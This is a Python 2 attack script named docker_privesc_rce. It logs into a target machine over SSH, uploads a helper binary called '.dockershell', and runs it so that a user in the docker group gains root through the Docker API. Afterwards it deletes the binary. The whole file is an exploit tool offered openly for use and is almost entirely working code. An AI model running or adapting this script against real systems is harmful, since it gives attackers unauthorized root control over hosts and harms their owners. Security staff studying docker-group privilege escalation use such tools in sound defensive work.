#!/usr/bin/env python2
#  -*- coding: utf-8 -*- ###########################################################################################################
#                                                                                                                                  #
#▓█████▄  ▒█████   ▄████▄   ██ ▄█▀▓█████  ██▀███   ██▓███   ██▀███   ██▓ ██▒   █▓▓█████   ██████  ▄████▄   ██▀███   ▄████▄  ▓█████ #
#▒██▀ ██▌▒██▒  ██▒▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒▓██░  ██▒▓██ ▒ ██▒▓██▒▓██░   █▒▓█   ▀ ▒██    ▒ ▒██▀ ▀█  ▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀ #
#░██   █▌▒██░  ██▒▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒▓██░ ██▓▒▓██ ░▄█ ▒▒██▒ ▓██  █▒░▒███   ░ ▓██▄   ▒▓█    ▄ ▓██ ░▄█ ▒▒▓█    ▄ ▒███   #
#░▓█▄   ▌▒██   ██░▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  ▒██▄█▓▒ ▒▒██▀▀█▄  ░██░  ▒██ █░░▒▓█  ▄   ▒   ██▒▒▓▓▄ ▄██▒▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄ #
#░▒████▓ ░ ████▓▒░▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒▒██▒ ░  ░░██▓ ▒██▒░██░   ▒▀█░  ░▒████▒▒██████▒▒▒ ▓███▀ ░░██▓ ▒██▒▒ ▓███▀ ░░▒████▒#
# ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░▒▓▒░ ░  ░░ ▒▓ ░▒▓░░▓     ░ ▐░  ░░ ▒░ ░▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░#
# ░ ▒  ▒   ░ ▒ ▒░   ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░░▒ ░       ░▒ ░ ▒░ ▒ ░   ░ ░░   ░ ░  ░░ ░▒  ░ ░  ░  ▒     ░▒ ░ ▒░  ░  ▒    ░ ░  ░#
# ░ ░  ░ ░ ░ ░ ▒  ░        ░ ░░ ░    ░     ░░   ░ ░░         ░░   ░  ▒ ░     ░░     ░   ░  ░  ░  ░          ░░   ░ ░           ░   #
#   ░        ░ ░  ░ ░      ░  ░      ░  ░   ░                 ░      ░        ░     ░  ░      ░  ░ ░         ░     ░ ░         ░  ░#
# ░               ░                                                          ░                   ░                 ░               #
#                                                                                                                                  #
#                                                                                                                                  #
# docker_privesc_rce nighter@nighter.se                                                                                            #
#                                                                                                                                  #
# DATE                                                                                                                             #
# 14/06/2018                                                                                                                       #
#                                                                                                                                  #
# DESCRIPTION                                                                                                                      #
# ssh's into a machine and privesc to root if you are part of the docker group by abuse the docker api                               #
#                                                                                                                                  #
#                                                                                                                                  #
# Mikael Kall - nighter@nighter.se                                                                                                 #
#                                                                                                                                  #
####################################################################################################################################

import atexit
import getpass
import paramiko
import signal
import sys
import os

# chdir to script working directory
os.chdir(os.path.realpath(os.path.dirname(sys.argv[0])))

# Bolean on when to cleanup.
CLEANUP = False

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print "\nYou pressed Ctrl+C!"
    cleanup()
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)


def exit_handler():
    global CLEANUP
    if CLEANUP is True:
        cleanup()


atexit.register(exit_handler)


def cleanup():
    ssh = ssh_connect()
    ssh.exec_command("rm -f ./.dockershell")
    ssh.close()


def ssh_connect():

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(IP, username=USER, password=PASSWORD, port=PORT)
    except:
        print("Authentication failed.")
        sys.exit(0)

    return ssh


def ssh_upload_and_execute():

    global CLEANUP

    if os.path.isfile('/usr/bin/sshpass') is False:
        print("Missing sshpass application, please install it.")
        sys.exit(0)

    if os.path.isfile('./.dockershell') is False:
        print("Missing dockershell it is required for the exploit to work.")
        sys.exit(0)

    ssh = ssh_connect()

    try:
        sftp = ssh.open_sftp()
        sftp.put('./.dockershell', './.dockershell')
    except:
        pass

    CLEANUP = True

    ssh.exec_command("chmod a+x ./.dockershell")
    stdin, stdout, stderr = ssh.exec_command("pwd")
    path = str(stdout.readlines()[0]).strip()

    if '/home' in path:
        os.system('sshpass -p %s ssh -p %s %s@%s %s/.dockershell' % (PASSWORD, PORT, USER, IP, path))
    else:
        os.system('sshpass -p %s ssh -p %s %s@%s ~/.dockershell' % (PASSWORD, PORT, USER, IP, path))


def print_usage():
    print ("""
▓█████▄  ▒█████   ▄████▄   ██ ▄█▀▓█████  ██▀███   ██▓███   ██▀███   ██▓ ██▒   █▓▓█████   ██████  ▄████▄   ██▀███   ▄████▄  ▓█████ 
▒██▀ ██▌▒██▒  ██▒▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒▓██░  ██▒▓██ ▒ ██▒▓██▒▓██░   █▒▓█   ▀ ▒██    ▒ ▒██▀ ▀█  ▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀ 
░██   █▌▒██░  ██▒▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒▓██░ ██▓▒▓██ ░▄█ ▒▒██▒ ▓██  █▒░▒███   ░ ▓██▄   ▒▓█    ▄ ▓██ ░▄█ ▒▒▓█    ▄ ▒███   
░▓█▄   ▌▒██   ██░▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  ▒██▄█▓▒ ▒▒██▀▀█▄  ░██░  ▒██ █░░▒▓█  ▄   ▒   ██▒▒▓▓▄ ▄██▒▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄ 
░▒████▓ ░ ████▓▒░▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒▒██▒ ░  ░░██▓ ▒██▒░██░   ▒▀█░  ░▒████▒▒██████▒▒▒ ▓███▀ ░░██▓ ▒██▒▒ ▓███▀ ░░▒████▒
 ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░▒▓▒░ ░  ░░ ▒▓ ░▒▓░░▓     ░ ▐░  ░░ ▒░ ░▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░
 ░ ▒  ▒   ░ ▒ ▒░   ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░░▒ ░       ░▒ ░ ▒░ ▒ ░   ░ ░░   ░ ░  ░░ ░▒  ░ ░  ░  ▒     ░▒ ░ ▒░  ░  ▒    ░ ░  ░
 ░ ░  ░ ░ ░ ░ ▒  ░        ░ ░░ ░    ░     ░░   ░ ░░         ░░   ░  ▒ ░     ░░     ░   ░  ░  ░  ░          ░░   ░ ░           ░   
   ░        ░ ░  ░ ░      ░  ░      ░  ░   ░                 ░      ░        ░     ░  ░      ░  ░ ░         ░     ░ ░         ░  ░
 ░               ░                                                          ░                   ░                 ░               
[nighter@nighter.se]
    """)
    print "Usage: %s <USERNAME>@<HOST:[PORT]>" % (sys.argv[0])
    sys.exit(0)

if __name__ == '__main__':

    if len(sys.argv) != 2:
        print_usage()

    HOST = sys.argv[1]

    if '@' not in HOST:
        print_usage()
    else:
        USER = HOST.split('@')[0]
        IP = HOST.split('@')[1]

    if ':' in IP:
        PORT = IP.split(':')[1]
        IP = IP.split(':')[0]
    else:
        PORT = 22

    PASSWORD = getpass.getpass('Password:')

    # Upload payload async
    ssh_upload_and_execute()
